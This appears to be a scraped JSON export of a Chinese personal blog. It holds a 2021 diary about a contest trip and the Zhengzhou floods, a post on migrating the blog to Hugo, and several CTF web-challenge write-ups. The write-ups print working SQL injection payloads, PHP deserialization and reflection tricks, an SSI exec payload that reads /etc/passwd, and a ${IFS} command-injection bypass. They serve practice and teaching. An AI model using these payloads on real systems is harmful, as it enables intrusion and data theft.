坐的急不可耐，一等奖是华为mate40 pro、二等奖是华为手表，剩下的都是些手环、摄像头、音响啥的不值钱。我们队伍最后是四个人三个三等奖，我拿了个手环，最最最最劲爆的消息就是：我们其中一位带队老师，中了一等奖！当时我们看到我们老师上台的时候人都傻了（因为老师去和其他学校搞关系了没和我们坐一起），更羡慕的是我们这位老师这次比赛其实带着自己老婆来哈尔滨玩一玩，然后美滋滋的抱着mate40 pro回家了，我们老师中了奖，我们也觉得不虚此行。赛后我们四个人就去打卡哈尔滨了。\n去了中央大街\n一直走到头江上的小酒吧，当时还驻场歌手在船上唱歌，我们就坐着听了好久吹了吹江边的风\n然后就是回家的时候，我们和老师没有订同一班的飞机但是时间都差不多，我们订了第二天7月19号中午11点的飞机但是延误了，就赶快找下一班的飞机是晚上18点，那天晚上在候机厅等了好久，一起玩原神，也就是这次带了一个队友开始入坑原神。我华为之夜中的一个手环还落到酒店了，当时老师的飞机停机已经安排了住宿，就托老师帮我回酒店拿了下，结果我们的飞机也不停的延误延误，最后等到0点乘客在前台和服务员理论，安排了辆车把我们送到酒店（和老师是同一个的，第二天我就去找老师拿东西了）。\n7·20特大暴雨 飞机通知第二天7月20号八点起飞，那天黑龙江天气特好也算是准时起飞了，就是落地跟上了郑州7·20特大暴雨的全程。\n我们当时落郑州的时候，就在郑州上面的云层里震了好一会，大概也有半个小时都是在很厚的云层里飞，什么都看不见，要是没飞机导航估计都不知道去哪了。\n我们落地那会算是赶上了好天气，仿佛就是让我们这一班飞机从天上下来一样，外面太阳露了一点雨下的很小。然后我们就坐着城郊线回市区，路上就感觉外面的天气不对劲，当时我记得4点都外面的天气就黑的离大谱，感觉像晚上7点左右的天气\n我们最后都转了二号线，但是我姐住处在五号线上和二号线隔了一站需要换乘，我原来不打算换乘，直接走一站过去，但是当我出门的时候人都傻了，看远处公交一半轮胎已经都没了。\n原来还有想淌水过去的想法，但是想着背着电脑就算了。又回去换乘了五号线坐到下一站，后来看了五号线被淹的视频就感到小害怕。下一站出站口就没有被淹这么厉害，但是我看周围也没有什么能存贮水的道牙什么的，纯流动的水都已经淹过我鞋底了。我跑了两家超市才买了东西会楼上，第一家因为断网了没办法收银。最最最难的一道坎就是房子在25+楼！！！\n然后就是在那没水没电的三天两夜，每天只上下楼一次保存体力，外出的时候去超市买水买面包，我妈还在小区的群里给我买了个应急的充电宝续命，我用自己电脑反向充电，发现了个平板还有50多的点，玩了玩连连看保持理智。在满屋子跑着找信号给爸妈报状态，无聊的时候拿着吃的和小板凳坐到楼顶看下面十字路口堵车😶‍🌫️\n最气的是啥，我在的这个小区没有电，但是隔壁的小区灯火辉煌，但凡有个电我都能打着单机无限续命。\n离开前的当天，我打算去我姐单位找补给，路上看到了真的是经历天灾后的城市，有一点点电影上的那种感觉了。路边都是隧道捞出来的车，到处都是泥泞，我走了好久才找到了一辆能用的共享单车，那几天好像全部的共享单车都免费骑助力郑州恢复，但是网不好使。\n天上的直升机\n逝者安息。\n后半年 基本上都是准备考研，等有时间再更。\n","date":"2022-02-03T09:47:43+08:00","permalink":"https://www.braindance.top/articles/2022/02/2021%E5%B9%B4%E5%BA%A6%E6%97%A5%E8%AE%B0/","title":"2021年度日记"},{"content":"\n大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。\n为什么选择Hugo 因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多依赖，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。\nhugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话：\n根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。\n所以感觉要是长期写东西的话，选个好的框架也是个长远的选择。\nhugo在github上的⭐也比hexo多。\n不过在迁移的过程中，最大的感受就是：Hugo在国内的使用者不多。\n网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了coder这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是DoIt，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。\n博客的部署 之前使用hexo，在最后使用的时候发现了Travis CI - Test and Deploy with Confidence 持续集成这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。\n所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客GitHub Actions 入门教程。\n发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。\n所以最后的部署的流程就是：\n本地push到github仓库\t\u0026ndash;\u0026gt;\t仓库Actions发布到github pages、服务器拉取page仓库。\n","date":"2022-01-31T11:31:54+08:00","permalink":"https://www.braindance.top/articles/2022/01/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/","title":"博客搬迁"},{"content":"easy_sql 在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是括号单引号闭合\nYou have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near \u0026lsquo;1\u0026rsquo;) LIMIT 0,1\u0026rsquo; at line 1\n过滤的字符有union，所以尝试报错注入，查询版本号。\n1 admin\u0026#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))# 接下来想要通过information_schema库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。\n最后参考了网上的一篇文章：mysql 注入 information_schema_绕过IDS过滤information_schema继续注入，模仿文章构造payload\n1 admin\u0026#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))# 回显为：Duplicate column name \u0026rsquo;no\u0026rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段\n1 Duplicate column name \u0026#39;28d9f90a-4120-4ee8-9079-4e7613699510\u0026#39; 直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了\n1 admin\u0026#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))# flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}\neasy_source 使用目录扫描，扫描到了.index.php.swo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 本题目没有其他代码了噢，就只有这一个文件，虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？ \u0026lt;?php class User { private static $c = 0; function a() { return ++self::$c; } function b() { return ++self::$c; } function c() { return ++self::$c; } function d() { return ++self::$c; } function e() { return ++self::$c; } function f() { return ++self::$c; } function g() { return ++self::$c; } function h() { return ++self::$c; } function i() { return ++self::$c; } function j() { return ++self::$c; } function k() { return ++self::$c; } function l() { return ++self::$c; } function m() { return ++self::$c; } function n() { return ++self::$c; } function o() { return ++self::$c; } function p() { return ++self::$c; } function q() { return ++self::$c; } function r() { return ++self::$c; } function s() { return ++self::$c; } function t() { return ++self::$c; } } $rc=$_GET[\u0026#34;rc\u0026#34;]; $rb=$_GET[\u0026#34;rb\u0026#34;]; $ra=$_GET[\u0026#34;ra\u0026#34;]; $rd=$_GET[\u0026#34;rd\u0026#34;]; $method= new $rc($ra, $rb); var_dump($method-\u0026gt;$rd()); 看最后的参数列表，使用参数创建对象，并且创建对象的初始化参数需要有两个$ra、$rb\n，源码虽然给出了User类，但是不知道有什么其他的方法，这时候想到了可能使用PHP的原生类。\n根据提示\n虽然你看到的不完全，但是你觉得我会把flag藏在哪里呢，仔细想想文件里面还有什么？\n应该想到看不完全可能是在代码注释中，百度获取类中的代码注释，可以得到一个ReflectionMethod类，并且ReflectionMethod类中刚好有一个getDocComment 方法可以获得注释：\n简介：ReflectionMethod 类报告了一个方法的有关信息。类报告了一个方法的有关信息\nReflectionFunctionAbstract::getDocComment — 获取注释内容\n源码中初始化创建对象为new $rc($ra, $rb)，传递了两个参数，ReflectionMethod类的初始化魔术方法也提供了两个参数\npublic ReflectionMethod::__construct ( mixed $class , string $name )\n所以构造第一个参数是User，第二个参数为源码里的那些方法名，一个一个尝试，在q方法中找到了flag的注释\npayload\n1 ?rc=ReflectionMethod\u0026amp;ra=User\u0026amp;rb=q\u0026amp;rd=getDocComment 结果\n1 你能发现我吗string(152) \u0026#34;/** * Increment counter * * @final * @static * @access publicCISCN{uLG8v-wGDDi-PfF4M-Pmc2U-uBqB2-} * @return int */\u0026#34; 题外话：在尝试过程中还发现了另一个类ReflectionClass\n简介：ReflectionClass 类报告了一个类的有关信息。\n和上面的那个类对比，两个类研究的对象不一样ReflectionMethod研究的是类中的方法，ReflectionClass 研究的是类。\n这个类中也有一个获得注释的函数ReflectionClass::getDocComment，但是其获得的是文档注释，即文件开头的/**/中内容，但是本题的注释是在函数里的。\n","date":"2021-08-18T17:21:24Z","permalink":"https://www.braindance.top/articles/2021/08/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/","title":"CISCN线上赛库存"},{"content":"ReadlezPHP 源码找到time.php?source\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php #error_reporting(0); class HelloPhp { public $a; public $b; public function __construct(){ $this-\u0026gt;a = \u0026#34;Y-m-d h:i:s\u0026#34;; $this-\u0026gt;b = \u0026#34;date\u0026#34;; } public function __destruct(){ $a = $this-\u0026gt;a; $b = $this-\u0026gt;b; echo $b($a); } } $c = new HelloPhp; if(isset($_GET[\u0026#39;source\u0026#39;])) { highlight_file(__FILE__); die(0); } @$ppp = unserialize($_GET[\u0026#34;data\u0026#34;]); 分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在HelloPhp中有一个__destruct方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如$a($b)格式进行函数调用，假如变量a为字符串var_dump，b是任意字符串，就相当于调用var_dump函数且参数为b。\n所以构造反序列化，调用assert函数执行phpinfo。如果向assert() 函数传递字符串，它将会被 assert() 当做 PHP 代码来执行)：\n1 2 3 4 5 6 7 8 9 \u0026lt;?php class HelloPhp { public $a=\u0026#39;phpinfo()\u0026#39;; public $b=\u0026#39;assert\u0026#39;; } $s=new HelloPhp(); echo serialize($s); POST请求\n1 time.php?data=O:8:\u0026#34;HelloPhp\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;s:9:\u0026#34;phpinfo()\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:6:\u0026#34;assert\u0026#34;;} 页面查找flag，在environment中找到flag\nEasySearch 进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到index.php.swp文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 \u0026lt;?php ob_start(); function get_hash(){ $chars = \u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^\u0026amp;*()+-\u0026#39;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(\u0026#34;Content-Type: text/html;charset=utf-8\u0026#34;); *** if(isset($_POST[\u0026#39;username\u0026#39;]) and $_POST[\u0026#39;username\u0026#39;] != \u0026#39;\u0026#39; ) { $admin = \u0026#39;6d0bc1\u0026#39;; if ( $admin == substr(md5($_POST[\u0026#39;password\u0026#39;]),0,6)) { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[+] Welcome to manage system\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; $file_shtml = \u0026#34;public/\u0026#34;.get_hash().\u0026#34;.shtml\u0026#34;; $shtml = fopen($file_shtml, \u0026#34;w\u0026#34;) or die(\u0026#34;Unable to open file!\u0026#34;); $text = \u0026#39; *** *** \u0026lt;h1\u0026gt;Hello,\u0026#39;.$_POST[\u0026#39;username\u0026#39;].\u0026#39;\u0026lt;/h1\u0026gt; *** ***\u0026#39;; fwrite($shtml,$text); fclose($shtml); *** echo \u0026#34;[!] Header error ...\u0026#34;; } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\u0026#39;[!] Failed\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;; }else { *** } *** ?\u0026gt; 登陆功能又一个验证，需要传入的passwd参数使用md5加密以后是以6d0bc1开头的。简单写个脚本跑一下就有了：\n1 2 3 4 5 6 7 8 9 10 11 # codeing=utf-8 import hashlib cnt=1; while True: md=hashlib.md5(str(cnt).encode(\u0026#34;utf8\u0026#34;)).hexdigest() if md.startswith(\u0026#34;6d0bc1\u0026#34;): print(cnt) cnt+=1 #2020666 #2305004 分析源码登陆以后会创建一个欢迎页，使用POST请求，抓包可以在响应头里找到创建文件的位置和名称。\n看了看文件后缀是一格没有见过的：shtml，然后学到到了shtml有一种漏洞：SSI注入漏洞\nSSI 注入全称Server-Side Includes Injection，即服务端包含注入。SSI 是类似于 CGI，用于动态页面的指令。SSI 注入允许远程在 Web 应用中注入脚本来执行代码。\n简单的命令执行\n1 \u0026#34;--\u0026gt;\u0026#39;--\u0026gt;`--\u0026gt;\u0026lt;\u0026lt;!--#exec cmd=\u0026#34;cat /etc/passwd\u0026#34;--\u0026gt; 我使用了反弹shell，自行修改一下命令即可。在/var/www/html目录下可以找到一个名为flag_990c66bf85a09c664f0b6741840499b2的文件，获得flag\n","date":"2021-04-20T17:12:43Z","permalink":"https://www.braindance.top/articles/2021/04/readlezphpeasysearch/","title":"ReadlezPHP\u0026EasySearch"},{"content":"还是同一场比赛的界面\n这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：你可别被我逮住了，臭弟弟，测试上面的序号，注意此时的url中有?id=猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个数字型注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。\n发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。\n贴出来自己的脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 # codeing=utf-8 import requests import time url=\u0026#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=\u0026#39; result=\u0026#39;\u0026#39; for x in range(1, 100): high = 127 low = 32 mid = (low + high) // 2 while high\u0026gt;low: # sql=\u0026#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)\u0026#34;%(i,c) # sql = \u0026#34;(ORD(SUBSTR((select(group_concat(column_name))from(information_schema.columns)where(table_name=\u0026#39;F1naI1y\u0026#39;)),%d,1))\u0026gt;%d)\u0026#34; % (x, mid) sql = \u0026#34;(ORD(SUBSTR((select(group_concat(password))from(F1naI1y)where(id=9)),%d,1))\u0026gt;%d)\u0026#34; % (x, mid) time.sleep(0.1) reponse=requests.get(url+sql) if \u0026#34;Click\u0026#34; in reponse.text: low=mid+1 else: high = mid mid = (low+high)/2 result += chr(int(mid)) print(result) 我是直接使用了判断字符的返回值1或0作为id的参数，因为使用group_concat拼接时字符串有逗号,所以字符ascii需要至少从44开始。\n下面是查询到的两个表F1naI1y 、Flaaaaag及结构\nF1naI1y ====\u0026gt; id,username,password\nFlaaaaag ====\u0026gt; id,fl4gawsl\n在第九项可以查得到flag，上面的sql语句已经准备好了。第一个是查询表名的，第二个是查询字段名，第三个是得到flag\n","date":"2021-04-18T19:11:51Z","permalink":"https://www.braindance.top/articles/2021/04/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-finalsql/","title":"极客大挑战 2019 FinalSQL"},{"content":"进入页面直接报错\n试试其他的地方，我的习惯是git泄露、请求头、robots.txt、hint.txt都看看。果然在robots下有内容\nUser-agent: * Disallow: /fAke_f1agggg.php\n访问fAke_f1agggg.php并且抓包，在响应头里有提示。\n访问fl4g.php才正式开始，源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 \u0026lt;img src=\u0026#34;/img.jpg\u0026#34;\u0026gt; \u0026lt;?php header(\u0026#39;Content-type:text/html;charset=utf-8\u0026#39;); error_reporting(0); highlight_file(__file__); //level 1 if (isset($_GET[\u0026#39;num\u0026#39;])){ $num = $_GET[\u0026#39;num\u0026#39;]; if(intval($num) \u0026lt; 2020 \u0026amp;\u0026amp; intval($num + 1) \u0026gt; 2021){ echo \u0026#34;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.\u0026lt;/br\u0026gt;\u0026#34;; }else{ die(\u0026#34;金钱解决不了穷人的本质问题\u0026#34;); } }else{ die(\u0026#34;去非洲吧\u0026#34;); } //level 2 if (isset($_GET[\u0026#39;md5\u0026#39;])){ $md5=$_GET[\u0026#39;md5\u0026#39;]; if ($md5==md5($md5)) echo \u0026#34;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.\u0026lt;/br\u0026gt;\u0026#34;; else die(\u0026#34;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\u0026#34;); }else{ die(\u0026#34;去非洲吧\u0026#34;); } //get flag if (isset($_GET[\u0026#39;get_flag\u0026#39;])){ $get_flag = $_GET[\u0026#39;get_flag\u0026#39;]; if(!strstr($get_flag,\u0026#34; \u0026#34;)){ $get_flag = str_ireplace(\u0026#34;cat\u0026#34;, \u0026#34;wctf2020\u0026#34;, $get_flag); echo \u0026#34;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.\u0026lt;/br\u0026gt;\u0026#34;; system($get_flag); }else{ die(\u0026#34;快到非洲了\u0026#34;); } }else{ die(\u0026#34;去非洲吧\u0026#34;); } ?\u0026gt; 一关一关的bypass。\n第一关\n重点在intval函数，intval函数有个特性:\n直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换\n这里需要num的值小于2020，加一后值大于2021，可以使用科学计数法方法绕过。构造payload2e9，遇到第一个函数转换时，因为是以2开头下一位是字符，会直接被截取为2；遇到第二个函数，因为使用了$num + 1会进行类型转换，2e9会先使用科学计数法计算出值并+1。\n第二关\n需要一个md5值，对这个值再次使用md5加密以后，使用弱类型比较，和原来的值相同。md5的一个弱类型比较绕过：\nPHP在处理哈希字符串时，它把每一个以“0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以“0E”开头的，那么PHP将会认为他们相同，都是0。\n使用脚本跑一下得到一个值：0e215962017。\n最后一层，是一个system函数执行，但是在之前有一些过滤\nstrstr函数匹配空格，可以使用${IFS}绕过（这个里面有更详细的：命令执行漏洞利用及绕过方式总结） str_ireplace会吧cat替换成wctf2020，所以不能使用cat命令，可以用：more、less、od、tail等等绕过，上面的博客里也有写道。 先使用ls查看下当前目录下的文件，发现一个名为fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag读取得到flag。\n最终payload：\n1 /fl4g.php?num=2e9\u0026amp;md5=0e215962017\u0026amp;get_flag=more${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag ","date":"2021-04-16T15:33:32Z","permalink":"https://www.braindance.top/articles/2021/04/wustctf2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E/","title":"WUSTCTF2020 朴实无华"},{"content":"一个登陆界面，再看下url地址为login.php，确认了使用的是php\n直接查看源码，在源码中找到了register.php。先注册一个进去看一看。\n是一个发布广告的信息页，发布广告时需要输入广告的标题和内容，联想一下之前做过的发布文章的，应该是sql注入，输入广告标题输入一个单引号'试一试\n广告详情中出现了数据库报错\n猜测应该是二次注入，发布时加上一些转义字符没有出现错误，但是查看详情时再次从数据库中取出带有payload的数据，可以执行sql语句。而且上面的单引号测试出来了是字符型单引号闭合。\n接下来是尝试过滤。我试出来的有空格（使用/**/绕过）、or，and（可以使用\u0026amp;\u0026amp;，||），同时or被过滤，就说明保存数据库表名的库information_schema没有办法查询，并且orderby也不能使用，需要使用其他办法获取表内容。\n测试一下当前表的字段数，从1开始加，一直会报字段数不匹配，直到尝试到22。还需要主义的是执行的sql语句后面的 LIMIT 0,1需要闭合，所以最后添加了一个单引号\n1 \u0026#39;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 说明回显位是2和3。\n由于没有办法查询表名，所以需要我们自己猜测，CTF比赛中常见的表名就是flag、users、举办方的缩写啥的。这种没有办法查询表名的题目表名应该都不会设置太难\n测试的语句\n1 \u0026#39;/**/union/**/select/**/1,(select/**/*/**/from/**/flag),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; 当测到users表时返回了当前字段数不匹配的错误，说名users里有多个字段，肯定没有办法显示在一列中。所以接下来是猜users表的字段数。\n首先讲解一波无列名注入。\n先来个正常表（flag）的查询\n我们知道在sql语句查询的时候，可以给列名起别名形如\n使用联合查询的时候，只要前后表的字段数相同，前面查询的就会成为表名\n所以当我们不知道flag表的字段，并且想要查询里面的内容时，比如我想查询flag表的flag字段，可以构造\n需要为子查询的结果再起一个别名（图中为x），这样我们就不用列名查询到了字段。总结一下思路就是：自己构造一个表名并且联合查询想要查询的表名，再使用group_concat函数输出自己构造的表名。\n所以测试users表的字段数时，就通过形如上图的格式，改变联合查询的字段数判断。\n最终的payload：\n1 \u0026#39;/**/union/**/select/**/1,(select/**/group_concat(b)/**/from(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\u0026#39; ","date":"2021-04-15T09:55:17Z","permalink":"https://www.braindance.top/articles/2021/04/swpu2019-web1/","title":"SWPU2019 Web1"},{"content":"寒假横向刷题（尽量） BUUCTF 💗🧡💛💚💙💜🤎🖤🤍 题都写这一个里面了，可以先用Ctrl+F搜索，还有部分是草稿还没有整理，不过我认为的思路已经整理出来了，看不懂还请大伙见谅。有问题了很乐意效劳💨\n2021.01.15 [HCTF 2018]WarmUp 进到靶机一个硕大的滑稽，查看源码有提示source.php\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 \u0026lt;?php highlight_file(__FILE__); class emmm { public static function checkFile(\u0026amp;$page) { $whitelist = [\u0026#34;source\u0026#34;=\u0026gt;\u0026#34;source.php\u0026#34;,\u0026#34;hint\u0026#34;=\u0026gt;\u0026#34;hint.php\u0026#34;]; if (! isset($page) || !is_string($page)) { echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } if (in_array($page, $whitelist)) { return true; } $_page = mb_substr( $page, 0, mb_strpos($page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . \u0026#39;?\u0026#39;, \u0026#39;?\u0026#39;) ); if (in_array($_page, $whitelist)) { return true; } echo \u0026#34;you can\u0026#39;t see it\u0026#34;; return false; } } if (! empty($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; is_string($_REQUEST[\u0026#39;file\u0026#39;]) \u0026amp;\u0026amp; emmm::checkFile($_REQUEST[\u0026#39;file\u0026#39;]) ) { include $_REQUEST[\u0026#39;file\u0026#39;]; exit; } else { echo \u0026#34;\u0026lt;br\u0026gt;\u0026lt;img src=\\\u0026#34;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\u0026#34; /\u0026gt;\u0026#34;; } ?\u0026gt; 发现白名单有source.php和hint.php，先去查看一下hint.php\nflag not here, and flag in ffffllllaaaagggg\n分析源码\n判断$_REQUEST['file']对象为空且为字符串 执行emmm类中的checkFile方法判断是否在白名单（确保函数返回是true） 文件包含 checkFile函数中字符串截取判断是否在白名单（代码17-24和26-34）所以有两种绕过方法。\n第一种 1 file=hint.php?../../../../../ffffllllaaaagggg 字符串截取将原字符串尾部加上?再截取第一个?之前的内容。所以需要在构造payload时问号前需要是白名单里的文件。问号之后，猜测flag位置在根目录下，所以使用尽可能多的../返回上级目录。\n第二种 1 hint.php%3F..%2F..%2F..%2F..%2F..%2Fffffllllaaaagggg 将第一种payload使用urlencode编码即可。\n[强网杯 2019]随便注 根据题目尝试sql注入，单引号报错，单引号加注释无报错，说明存在sql注入，当测试输入select时返回过滤的黑名单：\n1 return preg_match(\u0026#34;/select|update|delete|drop|insert|where|\\./i\u0026#34;,$inject); 这道题使用的是堆叠注入，原理\n在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。\n查看数据库\n1 1\u0026#39;;show databases; 查看当前库下的表\n1 1\u0026#39;;show tables; 查看两张表字段\n1 1\u0026#39;;show columns from words; 还有一种查看表的语句，在windows系统下，反单引号（`）是数据库、表、索引、列和别名用的引用符\n1 1\u0026#39;;desc `1919810931114514`; 找到了flag在的字段，接下来就是如何获取该字段的值。顺带一提，根据表的结构，初步判断默认查询的是word表中的字段，而flag在1919810931114514表中。\n网上找到的两种方法，分别是修改表名和使用预处理语句。\n使用预处理语句 因为select被过滤了，但是可以使用char函数，char() 函数将select的ASCII码转换为select字符串，接着利用concat()函数进行拼接得到select查询语句，从而绕过过滤。或者直接用concat()函数拼接select来绕过。\n1 char(115,101,108,101,99,116) 根据预处理语句格式构造payload\n创建一个sqli字符串值为查询sql语句，使用预处理语句赋值并执行。 1 1\u0026#39;;SET @sqli=concat(char(115,101,108,101,99,116),\u0026#39;* from `1919810931114514`\u0026#39;);PREPARE hacker from @sqli;EXECUTE hacker;# 不使用变量 1 1\u0026#39;;PREPARE sqli FROM CONCAT(\u0026#39;s\u0026#39;,\u0026#39;elect\u0026#39;,\u0026#39; * from `1919810931114514`\u0026#39;);EXECUTE sqli; # 还有一种 1 1\u0026#39;;SET @sqli = CONCAT(\u0026#39;s\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;l\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;t\u0026#39;,\u0026#39; * from `1919810931114514`\u0026#39;);PREPARE haha FROM@sqli ;EXECUTE haha; # 主要区别在于过滤的绕过方式，不要拘泥于一种方式。\n修改表名 修改表名的思路是：默认查询的是word表第一个字段，所以把word表修改为其他名称，将flag所在的1919810931114514表名修改为word。\n网上payload\n1 0\u0026#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;# 自己构造的payload\n1 0\u0026#39;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) # 之后执行\n1 1\u0026#39; or 1=1 # 查询表所有字段值即可。\n[极客大挑战 2019]EasySQL 用户名密码，尝试万能密码。\n1 2 \u0026#39;or 1=1 # 随便密码 一个万能密码的参考:https://www.cnblogs.com/pass-A/p/11134988.html\n[极客大挑战 2019]Havefun 直接源码找到php代码。payload\n1 ?cat=dog [SUCTF 2019]EasySQL 单引号无报错，尝试堆叠注入可以回显。\n和 [强网杯 2019]随便注这道题一样查库查表查字段\n1 2 1;show databases; 1;show tables; 但是执行\n1 2 1;desc `Flag`; 1;show columns from Flag; 返回了\u0026quot;Nonono.“测试出被过滤了：desc、from、Flag。\n接下来的都是抄网上的预期解也是第一次见。\n比赛时源码泄露\n1 select $_GET[\u0026#39;query\u0026#39;] || flag from flag 在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 